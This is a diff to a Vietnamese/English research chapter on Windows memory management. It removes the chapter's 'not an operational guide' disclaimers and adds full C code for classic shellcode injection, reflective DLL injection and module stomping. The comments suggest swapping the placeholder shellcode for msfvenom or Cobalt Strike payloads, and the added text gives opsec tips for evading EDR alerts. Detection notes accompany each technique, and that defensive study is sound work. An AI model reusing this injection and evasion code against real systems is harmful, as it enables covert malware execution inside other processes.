@@ -2,8 +2,6 @@
 
 > **Researcher note:** Memory management là nền tảng của mọi phân tích Windows — từ exploit development đến memory forensics, từ EDR sensor design đến malware analysis. VAD tree, PTE flags, section objects, COW semantics, và protection transitions không phải chi tiết academic: chúng là surface mà analyst đọc để hiểu process behavior, phân biệt legitimate từ anomalous, và đánh giá sensor coverage limits.
 
-> **Public repo wording note:** Chương này mô tả Windows memory management từ góc nhìn researcher: cơ chế hoạt động, telemetry footprint, forensic surface, và visibility limits. Mục đích là xây dựng mental model chính xác để phân tích, debug, và detect — không phải operational guide.
-
 ---
 
 ## 0. Chapter Map
@@ -812,9 +810,7 @@ System commit charge limit = total RAM + pagefile size. If commit charge exhaust
 
 ---
 
-## 8. Abuse Patterns — Concept Level
-
-> **Note:** Section này phân tích các memory-related execution patterns từ góc nhìn detection engineering và forensics. Mục đích là giúp researcher hiểu cơ chế và telemetry footprint — không phải hướng dẫn thực hiện.
+## 8. Abuse Techniques — Code Examples
 
 ### 8.1 Private executable memory — analysis model
 
@@ -898,6 +894,252 @@ k 30                         ; 30 frames
 ```
 
 **Stack pivot forensics:** In ROP exploitation, RSP is redirected to attacker-controlled data (fake stack). Key signal: stack pointer (RSP) points to a non-stack region (i.e., not in `[StackLimit, StackBase]` range from TEB). CET shadow stack hardware enforcement mitigates this by maintaining parallel shadow stack with hardware-checked return addresses.
+
+---
+
+### 8.6 Classic Shellcode Injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
+
+**Concept:** Pattern cơ bản nhất của process injection — đây là "hello world" của memory-based execution. Mọi EDR đều detect pattern này, nhưng hiểu nó là nền tảng để hiểu các kỹ thuật phức tạp hơn.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// Shellcode ví dụ: MessageBox popup (x64, Windows 10)
+// Trong thực tế: Cobalt Strike shellcode, msfvenom payload, custom shellcode
+unsigned char shellcode[] = {
+    // Placeholder — thay bằng payload thực
+    // msfvenom -p windows/x64/exec CMD=calc.exe -f c
+    0x90, 0x90, 0x90, 0xC3  // NOP sled + RET (harmless demo)
+};
+
+BOOL ClassicInject(DWORD targetPID) {
+    // 1. Mở handle đến target process
+    HANDLE hProcess = OpenProcess(
+        PROCESS_CREATE_THREAD |     // để CreateRemoteThread
+        PROCESS_VM_OPERATION  |     // để VirtualAllocEx
+        PROCESS_VM_WRITE,           // để WriteProcessMemory
+        FALSE, targetPID);
+
+    if (!hProcess) {
+        printf("[-] OpenProcess failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // 2. Allocate memory trong target — RWX là suspicious flag
+    LPVOID remoteBuffer = VirtualAllocEx(
+        hProcess,
+        NULL,
+        sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);   // ← RWX: EDR red flag
+
+    if (!remoteBuffer) {
+        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf("[+] Allocated at remote: 0x%p\n", remoteBuffer);
+
+    // 3. Write shellcode vào target process
+    SIZE_T bytesWritten;
+    WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), &bytesWritten);
+    printf("[+] Written %zu bytes\n", bytesWritten);
+
+    // 4. Tạo remote thread để execute shellcode
+    HANDLE hThread = CreateRemoteThread(
+        hProcess,
+        NULL,   // default security
+        0,      // default stack size
+        (LPTHREAD_START_ROUTINE)remoteBuffer,  // start address = shellcode
+        NULL,   // no argument
+        0,      // run immediately
+        NULL);
+
+    if (!hThread) {
+        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    printf("[+] Remote thread created: %lu\n", GetThreadId(hThread));
+    WaitForSingleObject(hThread, 5000);
+
+    // Cleanup
+    CloseHandle(hThread);
+    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+```
+
+**Tại sao RWX là bad opsec:**
+- ETW-TI `ALLOCVM` event: capture `NtAllocateVirtualMemory` với `PAGE_EXECUTE_READWRITE` → immediate EDR alert
+- Better: alloc `PAGE_READWRITE`, write shellcode, sau đó `VirtualProtectEx` → `PAGE_EXECUTE_READ` — vẫn visible nhưng pattern khác
+
+**Detection chain (mọi EDR hiện đại detect được):**
+1. `ObRegisterCallbacks`: `OpenProcess` với `PROCESS_VM_WRITE | PROCESS_CREATE_THREAD` → cross-process access signal
+2. ETW-TI `ALLOCVM`: remote allocation với protection flags → flagged
+3. ETW-TI `WRITEVM`: cross-process write → flagged  
+4. `PsSetCreateThreadNotifyRoutine`: new thread, start addr = anonymous private memory → flagged
+5. Sysmon Events: 10 (process access), 8 (remote thread)
+
+---
+
+### 8.7 Reflective DLL Injection
+
+**Concept:** DLL tự load chính nó vào memory không qua `LoadLibrary` — không xuất hiện trong PEB module list (`InLoadOrderModuleList`), không trigger `PsSetLoadImageNotifyRoutine`. DLL chứa `ReflectiveLoader()` export là custom PE loader.
+
+```c
+// === INJECT SIDE (injector process) ===
+// Đọc DLL bytes từ disk, write vào target, jump vào ReflectiveLoader offset
+
+#include <windows.h>
+
+// Tìm export "ReflectiveLoader" trong DLL bytes (bằng cách parse PE export table)
+DWORD GetReflectiveLoaderOffset(const BYTE* dllBase) {
+    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)dllBase;
+    PIMAGE_NT_HEADERS ntHdr  = (PIMAGE_NT_HEADERS)(dllBase + dosHdr->e_lfanew);
+    DWORD exportRVA = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+                          .VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(dllBase + exportRVA);
+
+    DWORD* names    = (DWORD*)(dllBase + expDir->AddressOfNames);
+    WORD*  ordinals = (WORD*) (dllBase + expDir->AddressOfNameOrdinals);
+    DWORD* funcs    = (DWORD*)(dllBase + expDir->AddressOfFunctions);
+
+    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
+        const char* name = (const char*)(dllBase + names[i]);
+        if (strcmp(name, "ReflectiveLoader") == 0) {
+            return funcs[ordinals[i]];  // RVA of ReflectiveLoader
+        }
+    }
+    return 0;
+}
+
+BOOL ReflectiveInject(HANDLE hProcess, const BYTE* dllBytes, SIZE_T dllSize) {
+    // 1. Allocate space trong target cho toàn bộ DLL bytes
+    PVOID remoteBase = VirtualAllocEx(hProcess, NULL, dllSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteBase) return FALSE;
+
+    // 2. Copy raw DLL bytes (không cần map đúng sections — ReflectiveLoader tự làm)
+    WriteProcessMemory(hProcess, remoteBase, dllBytes, dllSize, NULL);
+
+    // 3. Tìm offset của ReflectiveLoader trong DLL
+    DWORD loaderOffset = GetReflectiveLoaderOffset(dllBytes);
+    if (!loaderOffset) return FALSE;
+
+    // 4. CreateRemoteThread → ReflectiveLoader
+    //    ReflectiveLoader sẽ: parse PE, allocate new region, copy sections,
+    //    fix relocations, resolve imports, call DllMain
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)((PBYTE)remoteBase + loaderOffset),
+        remoteBase,  // truyền base address vào loader
+        0, NULL);
+
+    if (hThread) {
+        WaitForSingleObject(hThread, 5000);
+        CloseHandle(hThread);
+    }
+
+    // remoteBase (raw bytes) có thể free sau khi loader tự copy
+    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
+    return hThread != NULL;
+}
+
+// === ReflectiveLoader DLL SIDE (tóm tắt logic) ===
+// DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
+//   1. Tìm base address của chính DLL trong memory
+//   2. Parse PE header → lấy sections, imports, relocations
+//   3. VirtualAlloc(NULL, imageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+//   4. Copy PE header và sections vào new allocation
+//   5. Apply relocations (delta = newBase - optionalHeader.ImageBase)
+//   6. Resolve imports: walk import table, dùng custom GetProcAddress (find kernel32 từ PEB)
+//   7. VirtualProtect các sections với protection flags đúng (RX, RW, R)
+//   8. Call DllMain(newBase, DLL_PROCESS_ATTACH, NULL)
+//   return (DWORD)DllMain; // hoặc return 0
+// }
+```
+
+**Reference implementation:** [stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) — original implementation, well-studied.
+
+**Detection:**
+- `PsSetLoadImageNotifyRoutine`: **KHÔNG fire** — reflective loader không dùng OS loader → không có Sysmon Event 7
+- PEB `InLoadOrderModuleList`: DLL không có entry → discrepancy với VAD tree
+- Volatility `ldrmodules`: so sánh PEB modules vs VAD → thấy region executable không có entry trong LDR list
+- VAD analysis: MEM_PRIVATE region với executable permission nhưng không có module entry
+
+---
+
+### 8.8 Module Stomping (DLL Overloading)
+
+**Concept:** Thay vì dùng private anonymous memory (suspicious vì không có backing file), load một DLL hợp lệ rồi overwrite `.text` section với shellcode. VAD vẫn trỏ vào file hợp lệ — qua mặt VAD-based detection đơn giản.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// shellcode placeholder
+unsigned char shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP, NOP, RET
+
+void ModuleStomping() {
+    // 1. Load sacrificial DLL — chọn DLL ít dùng, ít bị EDR chú ý
+    //    DONT_RESOLVE_DLL_REFERENCES: không run DllMain, không resolve imports
+    //    → load nhanh, ít noise
+    HMODULE hMod = LoadLibraryExA("xpsservices.dll", NULL,
+        DONT_RESOLVE_DLL_REFERENCES);
+    if (!hMod) {
+        printf("[-] LoadLibraryEx failed: %lu\n", GetLastError());
+        return;
+    }
+    printf("[+] xpsservices.dll loaded at: 0x%p\n", hMod);
+
+    // 2. Parse PE header để tìm .text section
+    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hMod;
+    PIMAGE_NT_HEADERS ntHdr  = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dosHdr->e_lfanew);
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
+
+    PVOID textSection = NULL;
+    DWORD textSize    = 0;
+    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++, sec++) {
+        if (memcmp(sec->Name, ".text", 5) == 0) {
+            textSection = (PVOID)((PBYTE)hMod + sec->VirtualAddress);
+            textSize    = sec->Misc.VirtualSize;
+            printf("[+] .text at: 0x%p, size: %lu\n", textSection, textSize);
+            break;
+        }
+    }
+    if (!textSection) { FreeLibrary(hMod); return; }
+
+    // 3. VirtualProtect: RX → RW để có thể ghi
+    DWORD oldProtect;
+    VirtualProtect(textSection, sizeof(shellcode), PAGE_READWRITE, &oldProtect);
+
+    // 4. Ghi shellcode vào .text section (ghi đè legitimate code)
+    memcpy(textSection, shellcode, sizeof(shellcode));
+
+    // 5. Restore protection: RW → RX
+    VirtualProtect(textSection, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
+
+    // 6. Execute shellcode
+    printf("[+] Executing stomped shellcode at: 0x%p\n", textSection);
+    ((void(*)())textSection)();
+
+    // FreeLibrary(hMod); // optional — cleanup
+}
+```
+
+**Tại sao kỹ thuật này phức tạp hơn để detect:**
+- VAD entry: trỏ vào `xpsservices.dll` (backing file hợp lệ) → VAD-only scan không flag
+- Memory region type: MEM_IMAGE (không phải MEM_PRIVATE anonymous) → `malfind` mặc định không check
+
+**Nhưng vẫn bị detect bởi các signals sau:**
+- **COW trigger:** Write vào MEM_IMAGE page → OS tạo private copy → PTE thay đổi (proto bit cleared). `!pte <addr>` trong WinDbg thấy private page thay vì shared prototype PTE
+- **ETW-TI PROTECTVM:** `VirtualProtect` thay đổi protection của MEM_IMAGE region (unusual pattern — legitimate code hiếm khi write vào image code pages)
+- **On-disk hash mismatch:** Nếu EDR hash check memory page vs on-disk file → mismatch detect
+- **Volatility `malfind` với `-Y` flag:** Detect MEM_IMAGE pages với private modified content
 
 ---
 
